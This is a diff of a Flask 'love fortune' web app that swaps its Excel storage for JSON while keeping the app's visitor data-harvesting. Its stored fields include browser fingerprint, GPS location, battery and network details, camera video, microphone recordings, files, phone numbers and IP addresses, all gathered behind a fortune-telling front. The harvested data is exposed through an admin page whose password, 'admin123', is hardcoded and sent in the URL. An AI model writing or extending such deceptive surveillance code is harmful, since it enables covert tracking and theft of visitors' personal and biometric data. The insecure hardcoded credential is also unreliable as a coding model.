@@ -3,9 +3,6 @@ import json
 import os
 import random
 from datetime import datetime
-import pandas as pd
-import openpyxl
-from openpyxl import load_workbook
 
 app = Flask(__name__)
 
@@ -45,30 +42,20 @@ FORTUNES = [
 ]
 
 DATA_FILE = 'visitors.json'
-EXCEL_FILE = 'visitors_permanent.xlsx'
-BACKUP_FILE = 'visitors_permanent_backup.xlsx'
 
-def init_files():
+def init_json():
     if not os.path.exists(DATA_FILE):
         with open(DATA_FILE, 'w') as f:
             json.dump([], f)
-    if not os.path.exists(EXCEL_FILE):
-        df = pd.DataFrame(columns=[
-            'timestamp', 'name', 'fingerprint', 'latitude', 'longitude', 
-            'batteryLevel', 'batteryCharging', 'networkType', 'networkSpeed',
-            'deviceMemory', 'screen', 'timezone', 'userAgent', 'cameraVideo',
-            'microphone', 'files', 'mapUrl', 'phoneNumber', 'fortuneText', 'ip', 'sessionId'
-        ])
-        df.to_excel(EXCEL_FILE, index=False)
 
-def save_to_json(data):
-    init_files()
+def save_visitor(data):
+    init_json()
     with open(DATA_FILE, 'r') as f:
         visitors = json.load(f)
     session_id = data.get('sessionId')
     if session_id:
         for i, v in enumerate(visitors):
-            if v.get('sessionId') == sessionId:
+            if v.get('sessionId') == session_id:
                 visitors[i].update(data)
                 with open(DATA_FILE, 'w') as f:
                     json.dump(visitors, f, indent=2)
@@ -78,51 +65,10 @@ def save_to_json(data):
         json.dump(visitors, f, indent=2)
     return True
 
-def save_to_excel(data):
-    init_files()
-    try:
-        df = pd.read_excel(EXCEL_FILE)
-        new_row = pd.DataFrame([data])
-        df = pd.concat([df, new_row], ignore_index=True)
-        
-        with pd.ExcelWriter(EXCEL_FILE, engine='openpyxl') as writer:
-            df.to_excel(writer, index=False)
-            workbook = writer.book
-            worksheet = writer.sheets['Sheet1']
-            for column in worksheet.columns:
-                max_length = 0
-                column_letter = column[0].column_letter
-                for cell in column:
-                    try:
-                        if len(str(cell.value)) > max_length:
-                            max_length = len(str(cell.value))
-                    except:
-                        pass
-                worksheet.column_dimensions[column_letter].width = min(max_length + 2, 50)
-        
-        # Backup every 10 records
-        if len(df) % 10 == 0:
-            wb = load_workbook(EXCEL_FILE)
-            wb.save(BACKUP_FILE)
-            print(f"Backup created: {BACKUP_FILE}")
-        
-        return True
-    except Exception as e:
-        print(f"Excel save error: {e}")
-        return False
-
-def save_visitor(data):
-    save_to_json(data)
-    save_to_excel(data)
-    return True
-
 def get_visitors():
-    init_files()
-    try:
-        with open(DATA_FILE, 'r') as f:
-            return json.load(f)
-    except:
-        return []
+    init_json()
+    with open(DATA_FILE, 'r') as f:
+        return json.load(f)
 
 @app.route('/')
 def index():
@@ -147,15 +93,16 @@ def save_phone():
     phone = data.get('phoneNumber')
     fortune_text = data.get('fortune')
     if session_id:
-        init_files()
-        data = {
-            'sessionId': session_id,
-            'phoneNumber': phone,
-            'fortuneText': fortune_text,
-            'timestamp': datetime.now().isoformat(),
-            'ip': request.remote_addr
-        }
-        save_visitor(data)
+        init_json()
+        with open(DATA_FILE, 'r') as f:
+            visitors = json.load(f)
+        for v in visitors:
+            if v.get('sessionId') == session_id:
+                v['phoneNumber'] = phone
+                v['fortuneText'] = fortune_text
+                break
+        with open(DATA_FILE, 'w') as f:
+            json.dump(visitors, f, indent=2)
         return jsonify({'status': 'saved'})
     return jsonify({'status': 'error'}), 400
 
@@ -166,16 +113,14 @@ def admin():
         if password == 'admin123':
             visitors = get_visitors()
             if not visitors:
-                return '<h1>No data yet</h1><p><a href="/admin">Back</a> | <a href="/admin/excel?pass=admin123">Download Excel</a></p>'
-            html = '<h1>💕 Visitor Data (JSON)</h1><p><a href="/admin">Back</a> | <a href="/admin/excel?pass=admin123">📊 Download Excel</a> | <a href="/admin/json?pass=admin123">📥 JSON</a></p>'
-            html += '<table border="1" cellpadding="5" style="border-collapse:collapse;width:100%;">'
-            if visitors:
-                keys = visitors[0].keys()
-                html += '<tr>' + ''.join(f'<th style="background:#ff6b6b;color:white;padding:8px;">{k}</th>' for k in keys) + '</tr>'
-                for v in visitors[-20:]:  # Last 20
-                    html += '<tr>' + ''.join(f'<td style="padding:4px;max-width:150px;word-break:break-all;">{str(v.get(k, ""))[:80]}...</td>' for k in keys) + '</tr>'
+                return '<h1>No data yet</h1><p><a href="/admin">Back</a></p>'
+            html = '<h1>💕 Visitor Data</h1><p><a href="/admin">Back to login</a> | <a href="/admin/download?pass=admin123">Download JSON</a></p>'
+            html += '<table border="1" cellpadding="5">'
+            keys = visitors[0].keys()
+            html += '<tr>' + ''.join(f'<th>{k}</th>' for k in keys) + '</tr>'
+            for v in visitors:
+                html += '<tr>' + ''.join(f'<td>{str(v.get(k, ""))[:100]}</td>' for k in keys) + '</tr>'
             html += '</table>'
-            html += f'<p><small>Total: {len(visitors)} records. Check Excel for full data including base64 blobs!</small></p>'
             return html
         else:
             return '<h1>🔒 Wrong password. <a href="/admin">Try again</a></h1>'
@@ -185,7 +130,7 @@ def admin():
         <html>
         <head><title>Admin Login</title>
         <style>
-            body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: linear-gradient(135deg, #ff9a9e, #fecfef); }
+            body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f0f0; }
             .login-box { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 0 20px rgba(0,0,0,0.1); text-align: center; }
             input { padding: 10px; margin: 10px; width: 200px; border-radius: 10px; border: 1px solid #ccc; }
             button { padding: 10px 20px; background: #ff6b6b; color: white; border: none; border-radius: 10px; cursor: pointer; }
@@ -203,39 +148,12 @@ def admin():
         </html>
     '''
 
-@app.route('/admin/excel')
-def admin_excel():
-    pwd = request.args.get('pass')
-    if pwd == 'admin123':
-        if os.path.exists(EXCEL_FILE):
-            return send_file(EXCEL_FILE, as_attachment=True, download_name='love_fortune_visitors.xlsx')
-        return '<h1>No Excel data yet</h1><p><a href="/admin?pass=admin123">Back</a></p>'
-    return 'Unauthorized', 403
-
-@app.route('/admin/json')
-def admin_json():
+@app.route('/admin/download')
+def download():
     pwd = request.args.get('pass')
     if pwd == 'admin123':
         return jsonify(get_visitors())
-    return 'Unauthorized', 403
-
-@app.route('/admin/table')
-def admin_table():
-    pwd = request.args.get('pass')
-    if pwd == 'admin123':
-        try:
-            df = pd.read_excel(EXCEL_FILE)
-            html = '<h1>💕 Full Data Table</h1><p><a href="/admin/excel?pass=admin123">📥 Excel</a> | <a href="/admin?pass=admin123">Back</a></p>'
-            html += df.tail(50).to_html(index=False, escape=False, classes='table')
-            return f'''
-            <!DOCTYPE html>
-            <html><head><title>Full Data</title>
-            <style>body{{font-family:Arial;margin:40px;}}table{{width:100%;border-collapse:collapse;}}th,td{{border:1px solid #ddd;padding:6px;}}th{{background:#ff6b6b;color:white;}}</style>
-            </head><body>{html}</body></html>
-            '''
-        except:
-            return '<h1>No Excel data</h1>'
-    return 'Unauthorized', 403
+    return 'Unauthorized. Use /admin/download?pass=admin123', 403
 
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
@@ -328,7 +246,6 @@ HTML_TEMPLATE = '''
             letter-spacing: 2px;
             color: #b84c6c;
         }
-        #mapLink { display: none; margin-top: 15px; padding: 10px; background: #e3f2fd; border-radius: 15px; }
     </style>
 </head>
 <body>
@@ -356,9 +273,7 @@ HTML_TEMPLATE = '''
     <div id="progress" class="hidden"></div>
     <div id="result" class="hidden">
         <div class="fortune-box" id="fortuneText"></div>
-        <div id="mapLink">
-            🗺️ <span id="mapUrl">Loading map...</span>
-        </div>
+        <div id="mapLink" class="hidden">🗺️ Your love map: <span id="mapUrl"></span></div>
         <div id="smsSection" class="sms-prompt hidden">
             <p>📱 Send this fortune to your phone (permanently saved)</p>
             <input type="tel" id="phoneNumber" placeholder="Enter your mobile number">
@@ -669,9 +584,5 @@ HTML_TEMPLATE = '''
 '''
 
 if __name__ == '__main__':
-    init_files()
-    print("💾 PERMANENT STORAGE: JSON + Excel active")
-    print("Admin: /admin (pass: admin123)")
-    print("Excel: /admin/excel?pass=admin123")
-    print("Table: /admin/table?pass=admin123")
+    init_json()
     app.run(host='0.0.0.0', port=5000, debug=False)
